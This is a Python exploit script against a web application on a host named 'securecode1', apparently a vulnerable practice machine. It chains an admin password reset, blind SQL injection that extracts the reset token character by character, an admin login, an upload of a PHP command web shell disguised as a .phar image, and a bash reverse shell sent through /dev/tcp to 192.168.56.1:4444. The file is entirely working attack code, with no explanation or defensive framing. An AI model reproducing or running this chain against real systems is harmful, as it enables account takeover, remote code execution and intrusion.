#!/usr/bin/python

import requests
import string
import warnings
import sys

def resetPassword(user):
    url = "http://securecode1/login/resetPassword.php"
    data = {"username": user}
    req = requests.post(url, data=data, allow_redirects=True)
    if b"Password Reset Link has been sent to you via Email" in req.content:
        print("[+] Password reset token set!")
    else:
        print("[-] Password reset failed..")
        exit(0)

def doChangePassword(token, password):
    url = "http://securecode1/login/doChangePassword.php"
    data = {"token": token, "password": password}
    req = requests.post(url, data=data, allow_redirects=True)
    if b"Success!" in req.content:
        print("[+] Password Changed!")
    else:
        print("[-] Password change failed..")
        exit(0)

def loginAdmin(user, password):
    s = requests.Session()
    url = "http://securecode1/login/checkLogin.php"
    data = {"username": user, "password": password}
    req = s.post(url, data=data, allow_redirects=True)
    if b"Success!" in req.content:
        print("[+] Admin Logged in!")
        return s
    else:
        print("[-] Admin Login failed..")
        exit(0)

def getItemPage(s):
    url = "http://securecode1/item/index.php?page=item"
    req = s.get(url)
    if b"Raspery Pi 4" in req.content:
        print("[+] Got Item Page!")
    else:
        print("[-] Item Page access failed..")
        exit()

def uploadShell(s):
    url = "http://securecode1/item/updateItem.php"
    upload_data = {
        "id": "1",
        "id_user": "1",
        "name": "Raspery Pi 4",
        "description": "Latest Raspberry Pi 4 Model B with 2/4/8GB RAM raspberry pi 4 BCM2711 Quad core Cortex-A72 ARM v8 1.5GHz Speeder Than Pi 3B",
        "price": "92"
    }

    files = {
        'image': ('my_auto_shell4.phar', '<?php system($_REQUEST["cmd"]); ?>', 'application/octet-stream'),
        }

    req = s.post(url , files=files,data=upload_data, allow_redirects=True)
    if b"Item data has been edited" in req.content:
        print("[+] Shell Uploaded!")
    else:
        print("[-] Upload failed..")
        exit()

def getShell(s):
    url = "http://securecode1/item/image/my_auto_shell4.phar?cmd="
    cmd = "/bin/bash -c '/bin/bash -i >%26 /dev/tcp/192.168.56.1/4444 0>%261'"
    req = s.get(url+cmd)
    if req.status_code == 200:
        print("[+] Exploited..")
    else:
        print("[-] Shell access failed..")

def BlindSQL(sqli):
    url = "http://securecode1/item/viewItem.php?id="
    req = requests.get(url + sqli)
    if req.status_code == 404:
        return True

def getToken():
    warnings.simplefilter('ignore')

    chars = string.ascii_lowercase
    chars += string.digits
    chars += string.ascii_uppercase
    chars += string.punctuation

    nohit = ""
    output = ""
    for i in range(1,50):
        if nohit == " ":
            print("")
            break
        
        for c in chars:
            table_name = "user"
            column_name = "token"
            where_str = "id = 1"
            payload = 'select {} from {} where {}'.format(column_name, table_name, where_str)

            sqli = "1 and (select ascii(substr(({}),{},1)))={}".format(payload, str(i), ord(c))

            if BlindSQL(sqli):
                output += c
                print("\r" + output,end="")
                break
            
            if c == chars[len(chars)-1]:
                nohit += " "
    return output

def main():

    user = "admin"

    resetPassword(user)

    token = getToken()
    if token != "":
        print("[+] Token Found : %s"%(token))
    else:
        print("[-] Token not Found..")
        exit(0)

    password = "P@ssw0rd!"
    doChangePassword(token, password)

    s = loginAdmin(user, password)

    getItemPage(s)
    uploadShell(s)
    getShell(s)

if __name__ == "__main__":
    main()
